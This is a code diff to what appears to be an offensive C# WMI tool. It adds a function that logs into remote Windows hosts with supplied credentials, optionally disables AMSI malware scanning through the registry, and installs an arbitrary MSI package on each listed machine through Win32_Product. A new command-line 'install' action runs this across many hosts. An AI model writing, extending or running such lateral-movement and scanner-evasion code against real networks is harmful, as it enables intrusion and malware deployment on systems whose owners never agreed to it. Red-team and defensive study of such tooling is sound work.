@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.CodeDom;
 using System.Collections;
 using System.Collections.Generic;
@@ -1323,6 +1323,64 @@ EXAMPLES:
             }
         }
 
+        static void RemoteWMIInstall(string host, string path, string username, string password, bool result, bool disableAmsi, bool quiet = false)
+        {
+            string wmiNameSpace = "root\\cimv2";
+            ConnectionOptions options = new ConnectionOptions
+            {
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.PacketPrivacy,
+                EnablePrivileges = true,
+            };
+
+            if (!quiet) Console.WriteLine("\r\n[*] Host                           : {0}", host);
+            if (!quiet) Console.WriteLine("[*] Path                           : {0}", path);
+
+            if (!String.IsNullOrEmpty(username))
+            {
+                if (!quiet) Console.WriteLine("[*] User credentials               : {0}", username);
+                options.Username = username;
+                options.Password = password;
+            }
+
+            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);
+
+            try
+            {
+                scope.Connect();
+
+                List<ManagementBaseObject> originalAmsiKey = new List<ManagementBaseObject>();
+                if (disableAmsi)
+                {
+                    originalAmsiKey = SetRegKey(scope);
+                }
+
+                var wmiProduct = new ManagementClass(scope, new ManagementPath("Win32_Product"), new ObjectGetOptions());
+
+                ManagementBaseObject inParams = wmiProduct.GetMethodParameters("Install");
+                System.Management.PropertyDataCollection properties = inParams.Properties;
+
+                var rnd = new Random();
+                int randomXorKey = rnd.Next(1, 255);
+
+                inParams["AllUsers"] = true;
+                inParams["Options"] = "";
+                inParams["PackageLocation"] = path;
+                ManagementBaseObject outParams = wmiProduct.InvokeMethod("Install", inParams, null);
+
+                if (!quiet) Console.WriteLine("[*] Product install returned       : {0}", outParams["returnValue"]);
+
+                if (disableAmsi)
+                {
+                    UnsetRegKey(scope, originalAmsiKey);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
+            }
+        }
+
         static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password, string payload, bool disableAmsi, int triggerTimerAfter, int scriptKillTimeout)
         {
             try
@@ -1803,6 +1861,23 @@ EXAMPLES:
                     foreach (string computerName in computerNames)
                     {
                         RemoteWMIExecute(computerName, arguments["command"], username, password, result, disableAmsi);
+                    }
+                }
+                else
+                {
+                    Usage();
+                    return;
+                }
+            }
+            else if (arguments["action"] == "install")
+            {
+                // remote installer trigger
+                if ((arguments.ContainsKey("path")))
+                {
+                    string[] computerNames = arguments["computername"].Split(',');
+                    foreach (string computerName in computerNames)
+                    {
+                        RemoteWMIInstall(computerName, arguments["path"], username, password, result, disableAmsi);
                     }
                 }
                 else
